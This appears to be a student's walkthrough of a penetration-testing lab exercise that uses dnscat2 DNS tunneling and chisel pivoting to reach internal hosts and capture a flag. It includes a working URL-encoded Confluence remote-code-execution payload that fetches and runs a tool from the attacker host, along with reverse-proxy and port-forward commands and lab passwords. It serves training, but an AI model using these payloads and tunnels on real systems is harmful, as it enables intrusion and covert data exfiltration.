Questions
Follow the steps in this section to set up the dnscat2 server on FELINEAUTHORITY, and execute the dnscat2 client on PGDATABASE01. Download the binary from /exercises/dnscat_exercise_client on CONFLUENCE01. Set up a port forward with dnscat2 which allows you to run dnscat_exercise_client against the server running on port 4646 on HRSHARES.

# We can use dnscat2 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records. A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines. Let's try out dnscat2. We'll inspect traffic from FELINEAUTHORITY with tcpdump, filtering specifically on UDP port 53 (udp port 53).

ssh kali@192.168.234.7
password: 7he_C4t_c0ntro11er
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53

# Run the dnscat2-server passing the feline.corp domain as the only argument
kali@felineauthority:~$ dnscat2-server feline.corp
...
Starting Dnscat2 DNS server on 0.0.0.0:53
...

# Then exploit and access to the PGDATABASE01
# From KALI upload chisel to the CONFLUENCE01
curl http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.247/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

# Activate Chisel server and inject Chisel client execution CONFLUENCE01
./chisel server --port 8080 --reverse
curl http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.247:8080%20R:socks%27%29.start%28%29%22%29%7D/

# SSH to PGDATABASE01
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.234.215 
password: sqlpass123

# We'll run the dnscat2 client binary from the dnscat folder in the database_admin home directory, with the feline.corp domain passed as the only argument.
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
...
Session established!
...

# The dnscat2 client reports that a session has been established. We can check for connections back on our dnscat2 server.
...
New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:
>> Chirp Taking Dash Handle Horsed Cued
...

# Our session is connected! DNS is working exactly as expected. Requests from PGDATABASE01 are being resolved by MULTISERVER03, and end up on FELINEAUTHORITY.

NOTES: When run without a pre-shared --secret flag at each end, dnscat2 will print an authentication string. This is used to verify the connection integrity after the encryption has been negotiated.4 The authentication string in this case ("Annoy Mona Spiced Outran Stump Visas") is the same on both client and server, so we know there's no in-line tampering. Every time a connection is made, the authentication string will change.

# We can use our tcpdump process to monitor the DNS requests to feline.corp:
...
10:55:49.590002 IP 192.168.234.7.domain > 192.168.234.64.52426: 25600 1/0/0 TXT "69060112c344d3df824c97ffffcaecdf60" (111)
10:55:50.592864 IP 192.168.234.64.53455 > 192.168.234.7.domain: 44376+ [1au] TXT? db420112c33197d69c639000d77d8ff5c8.feline.corp. (75)
10:55:50.593338 IP 192.168.234.7.domain > 192.168.234.64.53455: 44376 1/0/0 TXT "45390112c303f1099ef0bbffffcaecdf60" (111)
...

# The dnscat2 process is using CNAME, TXT, and MX queries and responses. As indicated by this network data, DNS tunneling is certainly not stealthy! This output reveals a huge data transfer from the dnscat2 client to the server. All the request and response payloads are encrypted, so it's not particularly beneficial to keep logging the traffic.

# Lets kill tcpdump with CTRL + c

# Now we'll start interacting with our session from the dnscat2 server. Let's list all the active windows with the windows command, then run window -i from our new "command" shell to list the available commands.
dnscat2> windows 
...
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
...

dnscat2> window -i 1
...
This is a command session!
command (pgdatabase01) 1> 
...

# Since we're trying to tunnel in this Module, let's investigate the port forwarding options. We can use listen to set up a listening port on our dnscat2 server, and push TCP traffic through our DNS tunnel, where it will be decapsulated and pushed to a socket we specify. Let's background our console session by pressing C+z. Back in the command session, let's run listen --help.
command (pgdatabase01) 1> listen --help
...
Listens on a local port and sends the connection out the other side (like ssh
-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message
...

# Let's try to connect to the SMB port on HRSHARES, this time through our DNS tunnel. We'll set up a local port forward, listening on 4455 on the loopback interface of FELINEAUTHORITY, and forwarding to 445 on HRSHARES.
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.234.217:445

# Lets try to connect to SMB port.
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
...
        Scripts         Disk      
        Users           Disk
...
# Successful! lets work on our Questions
# Kill the dnscat2 window 1 sessions by CTRL + c
# Run the dnscat2 server agin 
kali@felineauthority:~$ dnscat2-server feline.corp

# PGDATABASE01 access to feline.corp 
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp

# Back to FELINEAUTHORITY
...
dnscat2> New window created: 2

>> Evoke Gifts Grows Undam Wears Pearly
...
dnscat2> window -i 2
command (pgdatabase01) 2> listen 0.0.0.0:4447 172.16.234.217:4646

# We had established the port forwarding to 0.0.0.0 (FELINEAUTHORITY) in port 4466
# Then we can now exploit the FELINEAUTHORITY IP with port 4447
./dnscat_exercise_client -i 192.168.234.7 -p 4447
Connecting to 192.168.234.7:4447
Flag: "OS{a0c459012adfe8319b5a54e63002ec4a}"







